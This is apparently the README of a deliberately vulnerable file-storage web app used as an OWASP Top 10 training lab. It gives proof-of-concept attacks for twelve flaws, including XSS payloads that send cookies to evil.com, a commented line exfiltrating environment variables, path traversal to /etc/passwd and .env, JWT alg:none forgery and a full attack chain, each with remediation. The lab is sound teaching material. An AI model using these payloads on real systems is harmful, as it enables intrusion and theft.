# ☁️ FileCloud — OWASP Top 10 (2025) Security Research Lab

> ⚠️ **Educational / Research Use Only**
> This application is intentionally vulnerable. It is designed for university-level security research, penetration testing practice, and OWASP Top 10 (2025) demonstration. **Never deploy this in production.**

---

## 📖 Application Scenario

**FileCloud** is a fictional cloud file storage SaaS platform for small businesses. Employees use it to upload, share, and manage company documents. The platform features:

- JWT-based authentication with session management
- Role-based access control (user / admin)
- File storage on AWS S3 (or local disk fallback)
- Admin dashboard with user management and activity logs
- REST API for file operations

This realistic scenario makes the vulnerabilities meaningful — each flaw maps to a real-world attack that could compromise a company's data.

---

## 🚀 Getting Started

### Prerequisites
- Node.js v16+
- npm
- (Optional) AWS account with S3 bucket for cloud storage demo

### Installation

```bash
git clone https://github.com/MoeinShahi/InsecureApp-OWASP-Top10-2025.git
cd InsecureApp-OWASP-Top10-2025
npm install
node app.js
```

Visit: http://localhost:3000

### Default Credentials (Intentional — see V5)
| Username | Password | Role  |
|----------|----------|-------|
| alice    | alice    | user  |
| bob      | bob      | user  |
| admin    | admin    | admin |

### AWS S3 Setup (Optional)
```bash
export S3_BUCKET=your-bucket-name
export AWS_REGION=us-east-1
# Credentials via EC2 instance role or:
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
node app.js
```

---

## 🗂️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    FileCloud (Node.js)                   │
│                                                          │
│  ┌──────────┐   JWT + Session   ┌──────────────────┐    │
│  │  Browser │ ◄──────────────── │   Express App    │    │
│  │  Client  │ ──────────────── ►│   (app.js)       │    │
│  └──────────┘                   └────────┬─────────┘    │
│                                          │               │
│                              ┌───────────┴──────────┐   │
│                              │                       │   │
│                    ┌─────────▼──────┐   ┌───────────▼─┐ │
│                    │  SQLite DB     │   │  AWS S3     │ │
│                    │  (filecloud.db)│   │  (uploads)  │ │
│                    └────────────────┘   └─────────────┘ │
└─────────────────────────────────────────────────────────┘
```

**Auth Flow:**
1. User POSTs credentials to `/login`
2. Server verifies bcrypt hash against SQLite
3. Server issues a **JWT** (HS256, secret: `secret123`) stored in the session
4. All API calls include the JWT via `Authorization: Bearer <token>` or session cookie
5. Server decodes JWT to identify user — **this is where most attacks happen**

---

## 🔓 Vulnerability Index

| # | Vulnerability | OWASP 2025 | Severity | Endpoint |
|---|--------------|------------|----------|----------|
| V1 | Session Fixation | A07 — Auth Failures | High | `/login?sid=` |
| V2 | JWT Algorithm Confusion (alg:none) | A02 — Crypto Failures | Critical | All JWT endpoints |
| V3 | IDOR via JWT user_id | A01 — Broken Access Control | Critical | `/api/profile/:id`, `/files?user=` |
| V4 | S3 Bucket Public-Read Misconfiguration | A05 — Security Misconfiguration | High | S3 storage |
| V5 | Default Credentials | A05 — Security Misconfiguration | Critical | `/login` |
| V6 | Path Traversal | A01 — Broken Access Control | Critical | `/download` |
| V7 | IDOR on File Delete | A01 — Broken Access Control | High | `/delete` |
| V8 | ReDoS | A05 — Security Misconfiguration | High | `/search` |
| V9 | JSON Type Confusion / Prototype Pollution | A03 — Injection | Medium | `/login` |
| V10 | Stored XSS via Activity Log | A03 — Injection | High | `/activity` |
| V11 | Supply Chain (Dependency Confusion) | A06 — Vulnerable Components | Critical | Startup |
| V12 | Verbose Error Disclosure | A10 — Logging Failures | Medium | `/files` |

---

## 🔐 V1 — Session Fixation (OWASP A07:2025)

### Description
The server accepts a session ID supplied via the `?sid=` query parameter **before** authentication. After the victim logs in, the session ID is **not regenerated**, so the attacker's pre-set session ID becomes the authenticated session.

### Attack Flow
```
1. Attacker generates a known session ID: "attacker_session_42"

2. Attacker sends victim a crafted link:
   http://filecloud.example.com/login.html?sid=attacker_session_42

3. Victim clicks the link and logs in normally.

4. Server sets req.session.userId = victim.id  (same session ID, not regenerated)

5. Attacker sends request with the same session ID:
   Cookie: connect.sid=s%3Aattacker_session_42.signature
   → Attacker is now authenticated as the victim
```

### PoC
```bash
# Step 1: Attacker pre-sets session
curl -c cookies.txt "http://localhost:3000/login.html?sid=mysession123"

# Step 2: Victim logs in (simulate by posting credentials with the same session)
curl -b cookies.txt -c cookies.txt -X POST http://localhost:3000/login \
  -d "username=alice&password=alice"

# Step 3: Attacker uses the session
curl -b "connect.sid=s%3Amysession123.placeholder" \
  http://localhost:3000/api/me
```

### Root Cause
```javascript
// VULNERABLE: session ID not regenerated after login
req.session.userId = user.id;
// FIX: req.session.regenerate(cb) before setting session data
```

---

## 🔑 V2 — JWT Algorithm Confusion / Weak Secret (OWASP A02:2025)

### Description
Two related flaws:
1. **Weak secret**: JWT signed with `secret123` — crackable in seconds with hashcat
2. **alg:none accepted**: Server accepts tokens with `"alg":"none"` and no signature

### Attack Flow — alg:none Token Forgery
```
1. Log in as alice → receive JWT:
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
   eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.
   <signature>

2. Decode payload (base64): {"user_id":1,"username":"alice","role":"user"}

3. Modify payload to admin: {"user_id":3,"username":"admin","role":"admin"}

4. Re-encode with alg:none (no signature):
   python3 forge_token.py --user_id 3 --username admin --role admin

5. Send forged token:
   curl -H "Authorization: Bearer <forged_token>" http://localhost:3000/api/me
   → Response: {"id":3,"username":"admin","role":"admin"}
```

### PoC — Forge Admin Token
```bash
python3 forge_token.py --user_id 3 --username admin --role admin
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

### PoC — Crack Weak Secret
```bash
# Using forge_token.py
python3 forge_token.py --crack <your_jwt_token>

# Using hashcat
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
# Cracks "secret123" in < 1 second
```

### Root Cause
```javascript
// VULNERABLE
jwt.verify(token, JWT_SECRET, { algorithms: ["HS256", "none"] });
const JWT_SECRET = "secret123";
// FIX: algorithms: ["HS256"] only, use cryptographically random 256-bit secret
```

---

## 🔓 V3 — IDOR via JWT user_id (OWASP A01:2025)

### Description
The JWT payload contains a plain integer `user_id`. The `/api/profile/:id` endpoint accepts any ID in the URL without verifying it matches the authenticated user's ID. Combined with V2 (alg:none), an attacker can access any user's data.

### Attack Flow
```
1. Log in as alice (user_id=1)
2. Notice JWT payload: {"user_id":1,"username":"alice","role":"user"}
3. Request admin profile:
   GET /api/profile/3
   Authorization: Bearer <alice_token>
   → Returns: {"id":3,"username":"admin","role":"admin","email":"admin@filecloud.io"}

4. List admin's files:
   GET /files?user=admin
   → Returns admin's file list

5. Download admin's files:
   GET /download?user=admin&file=report.pdf
```

### PoC
```bash
# Get alice's token first
TOKEN=$(curl -s -X POST http://localhost:3000/login \
  -d "username=alice&password=alice" -c /tmp/c.txt \
  && curl -s http://localhost:3000/api/token -b /tmp/c.txt | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# IDOR: access admin profile as alice
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/profile/3

# IDOR: list admin's files
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/files?user=admin"
```

### Root Cause
```javascript
// VULNERABLE: no ownership check
app.get("/api/profile/:id", verifyJWT, (req, res) => {
  const user = getUserById(parseInt(req.params.id)); // any ID accepted
  res.json(user);
});
// FIX: if (req.jwtUser.user_id !== targetId && req.jwtUser.role !== "admin") return 403
```

---

## ☁️ V4 — S3 Bucket Public-Read Misconfiguration (OWASP A05:2025)

### Description
Files are uploaded to S3 with `ACL: "public-read"`. This means:
1. Every uploaded file is publicly accessible without authentication
2. Anyone who knows (or guesses) the S3 URL can download any file
3. The bucket can be enumerated without credentials

### Attack Flow
```
1. Attacker discovers the S3 bucket name (from app source, error messages, or DNS)
   Bucket: filecloud-uploads-demo

2. Enumerate all files without authentication:
   aws s3 ls s3://filecloud-uploads-demo/ --no-sign-request --recursive

3. Download any file directly:
   curl https://filecloud-uploads-demo.s3.amazonaws.com/alice/salary_report.xlsx

4. If EC2 instance role is overly permissive, steal credentials via SSRF:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Returns temporary AWS credentials → full S3 access
```

### S3 Bucket Policy (Misconfigured)
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::filecloud-uploads-demo/*"
  }]
}
```

### Root Cause
```javascript
// VULNERABLE
multerS3({ s3, bucket: S3_BUCKET, acl: "public-read", ... })
// FIX: acl: "private", use pre-signed URLs for downloads (time-limited)
```

---

## 🔐 V5 — Default Credentials (OWASP A05:2025)

### Description
The application ships with hardcoded default credentials that are never changed.

### Attack
```bash
curl -X POST http://localhost:3000/login -d "username=admin&password=admin"
# → Redirected to /admin.html — full admin access
```

---

## 📂 V6 — Path Traversal (OWASP A01:2025)

### Description
The `/download` endpoint constructs a file path using `path.join()` without sanitizing `../` sequences. An attacker can escape the `uploads/` directory and read any file the Node.js process can access.

### Attack Flow
```bash
# Read the SQLite database (contains all bcrypt hashes)
curl "http://localhost:3000/download?user=alice&file=../../filecloud.db" -o stolen.db
sqlite3 stolen.db "SELECT username, password FROM users;"

# Read app source code
curl "http://localhost:3000/download?user=alice&file=../../app.js"

# Read environment variables (if stored in .env)
curl "http://localhost:3000/download?user=alice&file=../../.env"

# Read /etc/passwd (if Node process has permission)
curl "http://localhost:3000/download?user=alice&file=../../../../etc/passwd"
```

### Root Cause
```javascript
// VULNERABLE
const filePath = path.join(__dirname, "uploads", user, file);
// FIX:
const base = path.resolve(__dirname, "uploads", user);
const resolved = path.resolve(base, file);
if (!resolved.startsWith(base)) return res.status(403).send("Forbidden");
```

---

## 🗑️ V7 — IDOR on File Delete (OWASP A01:2025)

### Description
The `/delete` endpoint takes `username` from the request body without verifying it matches the authenticated user. Any authenticated user can delete any other user's files.

### Attack
```bash
# Logged in as alice, delete bob's files
curl -X POST http://localhost:3000/delete \
  -H "Content-Type: application/json" \
  -b session_cookie \
  -d '{"username":"bob","filename":"important_report.pdf"}'
```

---

## 💥 V8 — ReDoS (OWASP A05:2025)

### Description
The `/search` endpoint compiles a user-supplied string into a `RegExp` without validation. Certain patterns trigger catastrophic backtracking in V8's regex engine, blocking Node.js's single-threaded event loop.

### Attack
```bash
# Send catastrophic backtracking pattern
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -b session_cookie \
  -d '{"pattern":"^(a+)+$","username":"alice"}'

# Then send the matching input that causes hang:
# The server will be unresponsive for several seconds per request
# A single attacker can DoS the entire server
```

---

## 💉 V9 — JSON Type Confusion / Prototype Pollution (OWASP A03:2025)

### Description
The login route accepts JSON bodies but does not validate that `username` and `password` are strings. Sending `{"username":"__proto__","password":{"isAdmin":true}}` can pollute `Object.prototype`.

### Attack
```bash
# Prototype pollution
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"__proto__","password":{"isAdmin":true}}'

# Type confusion — boolean password
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'
```

---

## 📢 V10 — Stored XSS via Activity Log (OWASP A03:2025)

### Description
The `/activity` endpoint stores raw user-supplied `action` strings in SQLite. The admin panel fetches these and renders them using `innerHTML` with no sanitization. Any user can inject a script that executes in the admin's browser.

### Attack Flow
```
1. Attacker (any authenticated user) injects XSS payload:

   POST /activity
   {"username":"attacker","action":"<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">"}

2. Admin visits /admin.html

3. Activity log renders with innerHTML → script executes in admin's browser

4. Admin's session cookie is sent to attacker's server

5. Attacker uses stolen cookie to impersonate admin
```

### PoC
```bash
curl -X POST http://localhost:3000/activity \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","action":"<script>document.location='\''https://evil.com?c='\''+document.cookie</script>"}'
```

---

## 📦 V11 — Supply Chain / Dependency Confusion (OWASP A06:2025)

### Description
The application depends on `internal-logic`, a local package. If the package name is exposed (via source code, npm audit, or error messages), an attacker can publish a malicious package with the same name to the public npm registry with a higher version number. When a developer runs `npm update`, the malicious package is installed instead.

### Attack Flow
```
1. Developer commits package.json with "internal-logic": "file:internal-logic"
2. Attacker discovers the package name from the public GitHub repo
3. Attacker publishes: npm publish --name internal-logic --version 99.0.0
   (with malicious postinstall script that exfiltrates env vars)
4. Developer runs: npm update
5. npm installs attacker's version (higher version wins)
6. Malicious code runs on developer's machine and CI/CD pipeline
```

### Evidence
```javascript
// internal-logic/index.js — simulates the attack
module.exports = function() {
  console.log("[internal-logic] Supply chain vuln demo - package loaded on startup");
  // In a real attack: require('child_process').exec('curl evil.com?env='+JSON.stringify(process.env))
};
```

---

## 🔍 V12 — Verbose Error Disclosure (OWASP A10:2025)

### Description
Error handlers return full stack traces and internal paths to the client.

### Attack
```bash
# Trigger error by requesting non-existent user's files
curl "http://localhost:3000/files?user=nonexistent_user_xyz"
# Response includes: full stack trace, internal file paths, Node.js version
```

---

## 🎯 Combined Attack Chain (Full Compromise)

This demonstrates how chaining multiple vulnerabilities leads to complete system compromise:

```
Step 1: Reconnaissance
  → GET /files?user=admin (V3 IDOR) — discover admin has files
  → GET /download?user=alice&file=../../app.js (V6) — read source code
  → Source reveals: JWT_SECRET = "secret123"

Step 2: Credential Theft
  → GET /download?user=alice&file=../../filecloud.db (V6) — steal SQLite DB
  → sqlite3 filecloud.db "SELECT * FROM users" — get all bcrypt hashes
  → hashcat -m 3200 hashes.txt rockyou.txt — crack passwords offline

Step 3: Privilege Escalation
  → python3 forge_token.py --user_id 3 --role admin (V2) — forge admin JWT
  → GET /admin/users with forged token — enumerate all users

Step 4: Persistence via XSS
  → POST /activity with XSS payload (V10) — plant cookie stealer
  → Admin visits dashboard → cookie stolen → permanent admin access

Step 5: Data Exfiltration
  → aws s3 ls s3://filecloud-uploads-demo/ --no-sign-request (V4)
  → Download all company documents without authentication
```

---

## 🛡️ Remediation Guide

| Vulnerability | Fix |
|--------------|-----|
| Session Fixation | `req.session.regenerate()` after login |
| JWT alg:none | `algorithms: ["HS256"]` only; use 256-bit random secret |
| IDOR | Verify `req.jwtUser.user_id === targetId` on every request |
| S3 Public-Read | `acl: "private"` + pre-signed URLs for downloads |
| Default Credentials | Force password change on first login |
| Path Traversal | `path.resolve()` + prefix check |
| ReDoS | Use `safe-regex` library or worker thread with timeout |
| XSS | `textContent` instead of `innerHTML`; DOMPurify |
| Type Confusion | Validate `typeof username === "string"` |
| Supply Chain | Private npm registry; `npm ci` with lockfile; integrity checks |

---

## 📋 Summary Table

| # | Category | Severity | OWASP 2025 | Impact |
|---|----------|----------|------------|--------|
| V1 | Session Fixation | High | A07 | Account takeover |
| V2 | JWT alg:none + Weak Secret | Critical | A02 | Full auth bypass |
| V3 | IDOR via JWT user_id | Critical | A01 | Any user's data |
| V4 | S3 Public-Read | High | A05 | All files exposed |
| V5 | Default Credentials | Critical | A05 | Immediate admin access |
| V6 | Path Traversal | Critical | A01 | Server file disclosure |
| V7 | IDOR on Delete | High | A01 | Data destruction |
| V8 | ReDoS | High | A05 | Denial of service |
| V9 | Type Confusion | Medium | A03 | Auth bypass |
| V10 | Stored XSS | High | A03 | Admin session hijack |
| V11 | Supply Chain | Critical | A06 | Full system compromise |
| V12 | Verbose Errors | Medium | A10 | Info leak / recon |

---

> This project is for **educational and research purposes only**. All vulnerabilities are intentional and documented. Do not deploy on public infrastructure.
